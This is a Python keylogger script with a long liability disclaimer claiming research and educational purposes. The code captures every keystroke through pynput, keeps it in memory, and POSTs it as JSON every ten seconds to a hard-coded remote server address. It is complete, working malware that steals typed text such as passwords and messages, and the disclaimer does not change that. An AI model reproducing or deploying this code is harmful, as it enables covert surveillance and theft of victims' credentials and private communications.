# == DISCLAIMER OF LIABILITY FOR RESEARCH PURPOSES == The following disclaimer is intended to clarify the nature and
# purpose of the use of malicious code (hereinafter referred to as "the Code") for research and educational purposes.
# By accessing, utilizing, or engaging with the Code, you agree to the terms and conditions outlined herein: Research
# and Educational Purpose: The Code is used solely for research and educational purposes. It is not intended for any
# malicious or harmful activities, including but not limited to unauthorized access to systems, data breaches,
# or any other illegal activities. No Warranty or Guarantee: The Code is provided as-is, without any warranties or
# guarantees of any kind, including but not limited to the implied warranties of merchantability or fitness for a
# particular purpose. The user acknowledges that the Code may have defects, vulnerabilities, or unintended
# consequences. Responsible Use: Users are expected to use the Code responsibly and in compliance with all applicable
# laws, regulations, and ethical guidelines. Users are solely responsible for their actions and any consequences that
# may arise from the use of the Code. No Liability: The creators, maintainers, and distributors of the Code shall not
# be held liable for any direct, indirect, incidental, special, consequential, or punitive damages, including but not
# limited to loss of data, loss of profits, or any other loss or damage arising from the use or misuse of the Code.
# Indemnification: Users agree to indemnify and hold harmless the creators, maintainers, and distributors of the Code
# from any claims, liabilities, damages, or expenses (including attorney's fees) that may arise from the user's use
# of the Code. Legal Compliance: Users are responsible for ensuring that their use of the Code complies with all
# applicable local, national, and international laws and regulations. Ethical Considerations: Users are expected to
# conduct their research and experiments with high ethical standards, ensuring the privacy, security, and well-being
# of individuals and organizations. By accessing, using, or engaging with the Code, you acknowledge that you have
# read, understood, and agreed to the terms and conditions outlined in this disclaimer. Failure to adhere to these
# terms may result in legal consequences. This disclaimer is subject to change, and it is the responsibility of the
# user to review it periodically for updates.

from pynput import keyboard
import requests
import json
import threading

text = ""

ip_address = "192.168.3.135"
# ip received log
port_number = "0808"
time_interval = 10


def send_post_req():
    try:
        # Convert the Python object into a JSON string
        # POST it to the server
        # JSON the format {"keyboardData" : "<value_of_text>"}
        payload = json.dumps({"keyboardData": text})

        # POST Request to the server with ip address which listens on the port as specified in the Express server code.

        r = requests.post(f"http://{ip_address}:{port_number}", data=payload,
                          headers={"Content-Type": "application/json"})
        # data will get after time_interval (10 seconds)
        timer = threading.Timer(time_interval, send_post_req)
        # start the timer thread.
        timer.start()
    except:
        print("Couldn't complete request!")


# only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text

    # Based on the key press, handle the way the key gets logged to the in memory string.

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")


# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.
with keyboard.Listener(on_press=on_press) as listener:
    # start of by sending the post request to our server.
    send_post_req()
    listener.join()
